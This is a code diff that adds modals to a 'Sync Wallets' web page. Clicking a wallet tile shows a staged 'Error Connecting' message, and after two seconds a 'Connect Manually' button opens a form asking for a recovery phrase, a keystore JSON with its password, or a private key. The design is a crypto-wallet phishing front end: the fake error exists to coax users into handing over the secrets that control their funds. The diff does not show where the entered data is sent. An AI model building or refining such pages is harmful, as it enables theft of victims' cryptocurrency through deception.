@@ -6,6 +6,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <!-- Bootstrap CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link rel="stylesheet" type="text/css" href="css/modal.css">
+	<link rel="stylesheet" type="text/css" href="css/modal2.css">
     <link rel="stylesheet" href="./style.css">
     <title>Sync Wallets</title>
 </head>
@@ -29,9 +31,9 @@
 
     <section class="container section-three py-5">
                 <div class="row text-center gy-3">
-                    <div class="col-md-4 col-6"><img src="./img/btc.png" alt="Bitcoin"> <p class="py-3">Bitcoin</p></div>
-                    <div class="col-md-4 col-6"><img src="./img/eth.png" alt="Ethereum"><p class="py-3">Ethereum</p></div>
-                    <div class="col-md-4 col-6"><img src="./img/big-wallet.png" alt="wallet connect"><p class="py-3">Walletconnect</p></div>
+                    <div class="col-md-4 col-6" onclick="toyin()"><img src="./img/btc.png" alt="Bitcoin"> <p class="py-3">Bitcoin</p></div>
+                    <div class="col-md-4 col-6" onclick="toyin()"><img src="./img/eth.png" alt="Ethereum"><p class="py-3">Ethereum</p></div>
+                    <div class="col-md-4 col-6" onclick="toyin()"><img src="./img/big-wallet.png" alt="wallet connect"><p class="py-3">Walletconnect</p></div>
                 </div>
     </section>
 
@@ -43,8 +45,172 @@
         </ul>
     </section>
 
+
+
+
+    
+<!-- MODAL -->
+
+ 
+<div class="modal-sm popup center">
+      
+    <div class="modal-header">
+          <p id="dismiss-popup-btn" class="modal-title">Back</p>
+    </div>
+    <!-- <div class="modal-content"> -->
+        <div class="row title">
+                <p class="col-lg-7">Error <br> Connecting..</p>
+                <button class="connect" id="open-popup-btn2">Connect Manually</button>
+          </div>
+        <div class="description">
+                  <p>Bitcoin</p>
+                <p class="icons">Easy-to-use browser extension</p>
+          </div>
+    <!-- </div> -->
+</div>
+
+
+
+
+<!-- MODAL TWO -->
+
+
+
+
+<div class="popup2 center2">
+ <div class="icon2">
+    <img src="img/btc.png" class="btc"><p>Import your Bitcoin Wallet</p>
+  </div>
+ <div class="title2" id="btn">
+    <div class="nav nav-pills d-flex justify-content-between">
+        <div class=""><a id="phrase" class="btn">Phrase</a></div>
+        <div class="active"><a id="keystore" class="btn">Keystore <br class="d-md-none"> JSON</a></div>
+        <div class=""><a id="privatekey" class="btn">Private Key</a></div>
+    </div>
+ </div>
+
+ <div class="description2">
+     <div id="Keystore1">
+    <div class="form-group">	
+         <textarea class="form-control" rows="5" placeholder="Keystore JSON"></textarea>
+    </div><br>
+    <div class="form-group">
+          <input type="text" class="form-control" placeholder="Wallet password">
+    </div>
+    <p>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
+</div>
+ 
+ <div id="Phrase1">
+    <div class="form-group">	
+         <textarea class="form-control" rows="5" placeholder="Enter Recovery phrase"></textarea>
+    </div>
+    <p>Typically 12 (sometimes 24) words separated by single spaces.</p>
+</div>
+
+<div id="Private1">
+    <div class="form-group">
+          <input type="text" class="form-control" placeholder="Enter private key">
+    </div>
+    <p>Typically 12 (sometimes 24) words separated by single spaces.</p>
+</div>
+ 
+ </div>
+
+<div class="icons2">
+          <button class="col-lg-12 proceed">PROCEED</button>
+   </div>
+
+<div class="dismiss-btn2">
+    <button id="dismiss-popup-btn2">
+          Cancel
+    </button>
+</div>
+</div>
     
 
+<script type="text/javascript">
+	
+	function toyin() {
+		 document.getElementsByClassName("popup")[0].classList.add("active");
+
+         var connectBtn = document.getElementById('open-popup-btn2');
+        const btnTimeout = setTimeout(connect, 2000);
+
+        function connect() {
+            connectBtn.style.display = "block";
+        }
+	}
+</script>
+
+<!-- JAVASCRIPT FOR THE SECOND MODAL -->
+<script type="text/javascript">
+	 document.getElementById("open-popup-btn2").addEventListener("click",function(){
+  document.getElementsByClassName("popup2")[0].classList.add("active");
+  
+
+  document.getElementById('Keystore1').style.display="block";
+  document.getElementById('Phrase1').style.display="none";
+		document.getElementById('Private1').style.display="none";
+});
+ 
+document.getElementById("dismiss-popup-btn2").addEventListener("click",function(){
+  document.getElementsByClassName("popup2")[0].classList.remove("active");
+});
+
+
+
+// when Phrase is clicked on
+document.getElementById("phrase").addEventListener("click",function(){
+ 
+  document.getElementById('Private1').style.display="none";
+		document.getElementById('Keystore1').style.display="none";
+		document.getElementById('Phrase1').style.display="block";
+});
+
+
+
+// when keystore json is clicked on
+document.getElementById("keystore").addEventListener("click",function(){
+ document.getElementById('Keystore1').style.display="block";
+  document.getElementById('Private1').style.display="none";
+		document.getElementById('Phrase1').style.display="none";
+});
+
+
+// when private key is clicked on
+document.getElementById("privatekey").addEventListener("click",function(){
+ document.getElementById('Private1').style.display="block";
+  document.getElementById('Keystore1').style.display="none";
+		document.getElementById('Phrase1').style.display="none";
+});
+
+</script>
+
+
+
+
+
+<script type="text/javascript">
+   
+
+	document.getElementById("open-popup-btn").addEventListener("click",function(){
+  document.getElementsByClassName("popup")[0].classList.add("active");
+  
+});
+ 
+document.getElementById("dismiss-popup-btn").addEventListener("click",function(){
+  document.getElementsByClassName("popup")[0].classList.remove("active");
+});
+</script>
+
+<script>
+    // var connectBtn = document.getElementById('open-popup-btn2');
+    // const myTimeout = setTimeout(connect, 3000);
+
+    // function connect() {
+    //     connectBtn.style.display = "block";
+    // }
+</script>
       <!-- Option 1: Bootstrap Bundle with Popper -->
       <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
 
